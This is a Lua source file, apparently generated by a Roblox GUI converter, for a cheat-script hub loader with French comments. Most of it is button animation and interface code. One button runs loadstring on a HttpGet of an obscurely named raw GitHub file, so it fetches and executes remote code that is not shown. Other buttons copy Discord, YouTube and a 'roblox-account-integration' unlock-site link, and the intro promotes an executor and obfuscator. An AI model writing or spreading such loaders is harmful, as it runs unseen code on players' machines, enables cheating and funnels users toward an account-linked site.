		false,                          -- Pas de reverse
		0                               -- Pas de délai
	)
	
	-- Initialisation de la Frame
	-- On la rend invisible et minuscule au départ
	frame.Size = UDim2.new(0, 0, 0, 0)
	frame.Visible = true
	
	-- Création de l'animation vers la taille d'origine
	local animationApparition = TweenService:Create(frame, tweenInfo, {Size = tailleOriginale})
	
	-- Lancement de l'animation
	animationApparition:Play()
end
coroutine.wrap(UFBLH_fake_script)()

local function NQMNM_fake_script() -- X.LocalScript
	local script = Instance.new('LocalScript', _i[15])
	script.Name = [[LocalScript]]

	local button = script.Parent
	local gui = button:FindFirstAncestorOfClass("ScreenGui")
	local TweenService = game:GetService("TweenService")
	
	button.MouseButton1Click:Connect(function()
		if gui then
			local elements = gui:GetChildren() -- On récupère TOUT ce qui est dans le GUI
			local nombreElements = 0
			local termines = 0
	
			-- 1. On configure l'apparence de l'animation
			local infoSortie = TweenInfo.new(
				0.6, 
				Enum.EasingStyle.Back, 
				Enum.EasingDirection.In
			)
	
			for _, objet in pairs(elements) do
				-- On ne déplace que les choses visibles (Frame, Button, TextLabel, etc.)
				-- On ignore le script lui-même ou les dossiers
				if objet:IsA("GuiObject") then
					nombreElements = nombreElements + 1
	
					-- Calcul de la sortie à droite pour CET objet précis
					local positionSortie = UDim2.new(1.5, 0, objet.Position.Y.Scale, objet.Position.Y.Offset)
					local animation = TweenService:Create(objet, infoSortie, {Position = positionSortie})
	
					animation:Play()
	
					-- On compte quand chaque animation se termine
					animation.Completed:Connect(function()
						termines = termines + 1
						-- Une fois que le DERNIER objet a fini de bouger, on supprime tout
						if termines >= nombreElements then
							gui:Destroy()
						end
					end)
				end
			end
	
			-- Sécurité : Si le GUI est vide ou n'a pas d'objets animables
			if nombreElements == 0 then
				gui:Destroy()
			end
		end
	end)
	-----------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1 -- Taille normale (100%)
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.6, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.10, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(1.00, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.10, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(NQMNM_fake_script)()

local function MKFVQ_fake_script() -- Bouton Copier.LocalScript
	local script = Instance.new('LocalScript', _i[17])
	script.Name = [[LocalScript]]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local textToCopy = "https://v0-roblox-account-integration.vercel.app/"
	
		-- Copie dans le presse-papiers
		pcall(function()
			setclipboard(textToCopy)
		end)
	
		print("copié :", textToCopy)
	end)
	-----------------------------------------------------------------------------------------------------
	--// This is a Stroke Scale on Hover Effect, the uistroke thickness will grow on hover.
	
	local btn = script.Parent
	local stroke = btn.UIStroke
	local TS = game:GetService("TweenService")
	
	local origThick = stroke.Thickness
	local hoverThick = origThick + 2
	local tInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	
	local function makeTween(thick)
		return TS:Create(stroke, tInfo, {Thickness = thick})
	end
	
	btn.MouseEnter:Connect(function()
		makeTween(hoverThick):Play()
	end)
	
	btn.MouseLeave:Connect(function()
		makeTween(origThick):Play()
	end)
	-----------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(MKFVQ_fake_script)()

local function MBJAG_fake_script() -- ImageLabel.LocalScript
	local script = Instance.new('LocalScript', _i[27])
	script.Name = [[LocalScript]]

	local Players = game:GetService("Players")
	
	-- On récupère le joueur local (celui qui regarde son écran)
	local joueur = Players.LocalPlayer
	local imageLabel = script.Parent -- Ton ImageLabel
	
	-- On définit ce qu'on veut : juste la tête, en bonne qualité
	local typeImage = Enum.ThumbnailType.HeadShot
	local tailleImage = Enum.ThumbnailSize.Size420x420
	
	-- On demande à Roblox de récupérer le lien de l'image
	local imageURL, isReady = Players:GetUserThumbnailAsync(joueur.UserId, typeImage, tailleImage)
	
	-- Si l'image est prête et valide, on l'applique !
	if isReady then
		imageLabel.Image = imageURL
	else
		warn("Oups, impossible de charger la tête de " .. joueur.Name)
	end
end
coroutine.wrap(MBJAG_fake_script)()

local function RAPHC_fake_script() -- ?.LocalScript
	local script = Instance.new('LocalScript', _i[30])
	script.Name = [[LocalScript]]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		local success, err = pcall(function()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/Audinay/code/refs/heads/main/README/Kdjfjfjfjfjfjr/Brjfjfbfjrjrfjrjrri/Hfhjfbfj.mml'))()		
		end)
	end)
	
	-----------------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(RAPHC_fake_script)()

local function ROXQS_fake_script() -- TextLabel.LocalScript
	local script = Instance.new('LocalScript', _i[34])
	script.Name = [[LocalScript]]

	local LocalizationService = game:GetService("LocalizationService")
	local Players = game:GetService("Players")
	
	local textLabel = script.Parent
	local player = Players.LocalPlayer
	
	-- On récupère le code de langue du joueur (ex: "fr-fr", "en-us", "es-es")
	local locale = LocalizationService.RobloxLocaleId
	
	-- Table de traduction professionnelle
	local translations = {
		["fr"] = "Appuyez sur ce bouton pour accéder au site, puis déverrouillez l'accès au script.",
		["en"] = "Press this button to proceed to the site and complete the unlocking process to access the script.",
		["es"] = "Presione este botón para acceder al sitio y completar el proceso de desbloqueo para acceder al script.",
		["pt"] = "Pressione este botão para acessar o site e concluir o processo de desbloqueio para acessar o script.",
		["de"] = "Drücken Sie diese Schaltfläche, um die Website aufzurufen und den Freischaltvorgang für das Skript abzuschließen.",
		["vi"] = "Nhấn nút này để truy cập trang web và hoàn tất quá trình mở khóa để truy cập script."
	}
	
	-- Fonction pour extraire le préfixe (ex: transforme "fr-fr" en "fr")
	local function getLanguagePrefix(localeId)
		return string.sub(localeId, 1, 2)
	end
	
	local langCode = getLanguagePrefix(locale)
	
	-- On applique la traduction correspondante, sinon on met de l'anglais par défaut
	if translations[langCode] then
		textLabel.Text = translations[langCode]
	else
		textLabel.Text = translations["en"] -- Langue par défaut si pays non listé
	end
end
coroutine.wrap(ROXQS_fake_script)()

local function HIFOX_fake_script() -- TextLabel.LocalScript
	local script = Instance.new('LocalScript', _i[42])
	script.Name = [[LocalScript]]

	local RunService = game:GetService("RunService")
	local textLabel = script.Parent
	
	-- Recherche automatique des éléments pour pas te prendre la tête
	local stroke = textLabel:FindFirstChildWhichIsA("UIStroke")
	if not stroke then
		warn("Erreur : Il manque le UIStroke dans le TextLabel !")
		return
	end
	
	local gradient = stroke:FindFirstChildWhichIsA("UIGradient")
	if not gradient then
		warn("Erreur : Il manque le UIGradient dans le UIStroke !")
		return
	end
	
	-- Paramètres que tu peux modifier
	local vitesseRotation = 250 -- Vitesse du tour (plus c'est grand, plus ça va vite)
	local nombreDeClignotements = 3 -- Combien de fois ça clignote à la fin du tour
	local vitesseClignotement = 0.1 -- Temps en secondes entre chaque flash
	
	-- Boucle infinie pour l'animation complète
	task.spawn(function()
		while true do
			-- 1. FAIRE LE TOUR COMPLET (De 0 à 360 degrés)
			local rotationActuelle = 0
			gradient.Rotation = 0
	
			while rotationActuelle < 360 do
				-- On attend la prochaine frame et on calcule le temps passé (deltaTime)
				local deltaTime = RunService.RenderStepped:Wait()
				rotationActuelle = rotationActuelle + (vitesseRotation * deltaTime)
	
				-- On applique la rotation (en bloquant à 360 maximum pour finir le tour proprement)
				gradient.Rotation = math.min(rotationActuelle, 360)
			end
	
			-- Petite pause quand le tour est fini avant de clignoter
			task.wait(0.2)
	
			-- 2. CLIGNOTER
			for i = 1, nombreDeClignotements do
				stroke.Transparency = 1 -- Devient invisible
				task.wait(vitesseClignotement)
				stroke.Transparency = 0 -- Redevient visible
				task.wait(vitesseClignotement)
			end
	
			-- Petite pause avant de relancer un nouveau tour
			task.wait(0.5)
		end
	end)
end
coroutine.wrap(HIFOX_fake_script)()

local function XIODL_fake_script() -- ImageLabel.LocalScript
	local script = Instance.new('LocalScript', _i[48])
	script.Name = [[LocalScript]]

	-- On récupère le service qui gère les entrées du joueur (Clavier, Souris, Tactile)
	local UserInputService = game:GetService("UserInputService")
	
	-- On définit les variables pour les éléments de ton interface graphique
	local imageLabelDeLInterface = script.Parent
	local texteDeLInterface = imageLabelDeLInterface:WaitForChild("pomlk1")
	
	-- On définit les variables pour tes IDs d'images exactes
	local imagePourLePC = "rbxassetid://121198413774602"
	local imagePourLeTelephone = "rbxassetid://107807340871451"
	
	-- On crée une fonction bien détaillée pour détecter l'appareil
	local function DetecterAppareilDuJoueur()
	
		-- On vérifie si l'appareil possède un écran tactile
		local possedeEcranTactile = UserInputService.TouchEnabled
	
		-- On vérifie si l'appareil possède un clavier physique connecté
		local possedeClavier = UserInputService.KeyboardEnabled
	
		-- On vérifie si l'appareil possède une souris connectée
		local possedeSouris = UserInputService.MouseEnabled
	
		-- On fait la condition pour savoir si c'est un téléphone
		-- Un téléphone a un écran tactile mais n'a pas de clavier physique intégré
		if possedeEcranTactile == true and possedeClavier == false then
	
			return "Telephone"
	
			-- Si ce n'est pas un téléphone, on considère que c'est un PC
		else
	
			return "PC"
	
		end
	
	end
	
	-- On crée une fonction pour appliquer l'image et le texte selon l'appareil détecté
	local function ActualiserLInterfaceGraphique()
	
		-- On appelle notre fonction de détection
		local appareilDetecte = DetecterAppareilDuJoueur()
	
		-- Si l'appareil détecté est un téléphone
		if appareilDetecte == "Telephone" then
	
			-- On met l'image du téléphone
			imageLabelDeLInterface.Image = imagePourLeTelephone
	
			-- On change le texte pour écrire téléphone
			texteDeLInterface.Text = "Téléphone"
	
			-- Si l'appareil détecté est un PC
		elseif appareilDetecte == "PC" then
	
			-- On met l'image du PC
			imageLabelDeLInterface.Image = imagePourLePC
	
			-- On change le texte pour écrire PC
			texteDeLInterface.Text = "PC"
	
		end
	
	end
	
	-- On lance la fonction finale une fois que le script est chargé
	ActualiserLInterfaceGraphique()
end
coroutine.wrap(XIODL_fake_script)()

local function RFJTP_fake_script() -- Bouton discord.LocalScript
	local script = Instance.new('LocalScript', _i[50])
	script.Name = [[LocalScript]]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local textToCopy = "https://discord.gg/m7FnqzEm"
	
		-- Copie dans le presse-papiers
		pcall(function()
			setclipboard(textToCopy)
		end)
	
		print("copié :", textToCopy)
	end)
	
	-----------------------------------------------------------------------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(RFJTP_fake_script)()

local function YMYXT_fake_script() -- Bouton YouTube.LocalScript
	local script = Instance.new('LocalScript', _i[52])
	script.Name = [[LocalScript]]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local textToCopy = "https://www.youtube.com/@SORONICEv"
	
		-- Copie dans le presse-papiers
		pcall(function()
			setclipboard(textToCopy)
		end)
	
		print("copié :", textToCopy)
	end)
	
	-----------------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(YMYXT_fake_script)()

local function AQIGO_fake_script() -- Bouton de déplacement.LocalScript
	local script = Instance.new('LocalScript', _i[56])
	script.Name = [[LocalScript]]

	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService") -- Requis pour la fluidité
	
	local boutonDrag = script.Parent
	local guiABouger = boutonDrag.Parent
	
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	-- Nouvelle variable : la position vers laquelle la fenêtre DOIT aller
	local targetPosition = guiABouger.Position 
	
	-- RÉGLAGE DU STYLE : Plus le chiffre est proche de 0, plus ça "glisse" avec du retard. (ex: 0.1)
	-- Plus le chiffre est proche de 1, plus c'est instantané.
	local vitesseFluidite = 0.30 
	
	-- Fonction qui calcule la destination (mais ne bouge pas encore la fenêtre)
	local function update(input)
		local delta = input.Position - dragStart
	
		-- On met à jour la CIBLE, pas la position réelle
		targetPosition = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + delta.X, 
			startPos.Y.Scale, startPos.Y.Offset + delta.Y
		)
	end
	
	-- Quand on clique ou qu'on pose le doigt
	boutonDrag.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = guiABouger.Position
			targetPosition = guiABouger.Position -- On synchronise au départ
	
			-- Quand on lâche
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	-- Quand on bouge la souris/le doigt PENDANT le clic
	boutonDrag.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	-- Met à jour la cible quand on bouge
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
	-- LA MAGIE EST ICI : À chaque image (frame), la fenêtre se rapproche de la cible
	RunService.RenderStepped:Connect(function()
		-- Le Lerp crée ce mouvement élastique/fluide
		guiABouger.Position = guiABouger.Position:Lerp(targetPosition, vitesseFluidite)
	end)
end
coroutine.wrap(AQIGO_fake_script)()

local function VJGRF_fake_script() -- TextLabel.LocalScript
	local script = Instance.new('LocalScript', _i[57])
	script.Name = [[LocalScript]]

	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	
	local LocalPlayer = Players.LocalPlayer
	local TextLabel = script.Parent
	
	-- ==========================================
	-- 🧠 MÉMOIRE DU JOUEUR (Ne joue qu'une seule fois)
	-- ==========================================
	local saveFileName = "SoroniceIntro_" .. tostring(LocalPlayer.UserId) .. ".txt"
	
	local supporteSauvegarde = (isfile and writefile)
	if supporteSauvegarde then
		local dejaVu = false
		pcall(function()
			if isfile(saveFileName) then
				dejaVu = true
			end
		end)
	
		if dejaVu then
			-- CORRECTION : On ne détruit QUE le texte, pas le GUI
			TextLabel:Destroy()
			return -- Coupe le script
		end
	end
	
	local oldScale = TextLabel:FindFirstChildOfClass("UIScale")
	if oldScale then oldScale:Destroy() end
	
	-- ==========================================
	-- ⚙️ CONFIGURATION DU FONDU
	-- ==========================================
	local tempsFondu = 1.0   
	local tempsLecture = 4.0 
	
	-- ==========================================
	-- 🌍 TRADUCTIONS INTÉGRALES (NE PAS SUPPRIMER)
	-- ==========================================
	local traductions = {
		FR = {
			"Bienvenue sur notre Hub ! Nous vous accueillons à bras ouverts.",
			"Un bug, une question ou un bannissement ? Notre équipe Discord est là pour vous.",
			"Ici, c'est votre communauté : votez pour les futurs ajouts et évolutions.",
			"Nouveau avec les scripts ? Notre chaîne YouTube regorge de tutoriels détaillés.",
			"Développeurs, profitez de notre obfuscateur privé et de nos UI sur mesure.",
			"Passez au niveau supérieur avec nos accès Premium : finis les systèmes de clés quotidiens.",
			"Et restez à l'affût... notre propre exécuteur arrive très bientôt.",
			"Merci de votre confiance. L'expérience commence maintenant."
		},
		EN = {
			"Welcome to our Hub! We welcome you with open arms.",
			"Got a bug, a question, or a ban? Our Discord team is here to help.",
			"This is your community: vote on future features and updates.",
			"New to scripting? Our YouTube channel is full of detailed tutorials.",
			"Developers, take advantage of our private obfuscator and custom UIs.",
			"Level up with Premium access: say goodbye to daily key systems.",
			"Stay tuned... our very own executor is coming soon.",
			"Thank you for your trust. The experience begins now."
		},
		ES = {
			"¡Bienvenido a nuestro Hub! Te recibimos con los brazos abiertos.",
			"¿Un error, una pregunta o un baneo? Nuestro equipo de Discord está aquí para ayudarte.",
			"Esta es tu comunidad: vota por futuras funciones y actualizaciones.",
			"¿Nuevo en los scripts? Nuestro canal de YouTube está lleno de tutoriales detallados.",
			"Desarrolladores, ofuscador privado y UIs personalizadas disponibles.",
			"Sube de nivel con el acceso Premium: adiós a las claves diarias.",
			"Mantente atento... nuestro ejecutor llegará muy pronto.",
			"Gracias por tu confianza. La experiencia comienza ahora."
		}
	}
	
	-- Choisis la langue ici ("FR", "EN", ou "ES")
	local langueActuelle = "FR" 
	local messages = traductions[langueActuelle] or traductions["FR"]
	
	local tweenInfo = TweenInfo.new(tempsFondu, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
	local fadeOutTween = TweenService:Create(TextLabel, tweenInfo, {TextTransparency = 1, TextStrokeTransparency = 1})
	local fadeInTween = TweenService:Create(TextLabel, tweenInfo, {TextTransparency = 0, TextStrokeTransparency = 0})
	
	-- ==========================================
	-- 🎬 LANCEMENT DE LA SÉQUENCE
	-- ==========================================
	local function playSequence()
		TextLabel.TextTransparency = 1
		TextLabel.TextStrokeTransparency = 1
	
		for i, msg in ipairs(messages) do
			TextLabel.Text = msg
			fadeInTween:Play()
			fadeInTween.Completed:Wait()
	
			task.wait(tempsLecture)
	
			fadeOutTween:Play()
			fadeOutTween.Completed:Wait()
	
			task.wait(0.3)
		end
	
		-- Sauvegarde de la progression
		if supporteSauvegarde then
			pcall(function()
				writefile(saveFileName, "Le joueur a vu l'introduction.")
			end)
		end
	
		-- CORRECTION : Nettoyage final, on ne détruit QUE le texte
		TextLabel:Destroy()
	end
	
	-- Lancement en arrière-plan pour ne pas bloquer le reste de tes scripts
	task.spawn(playSequence)
end
coroutine.wrap(VJGRF_fake_script)()
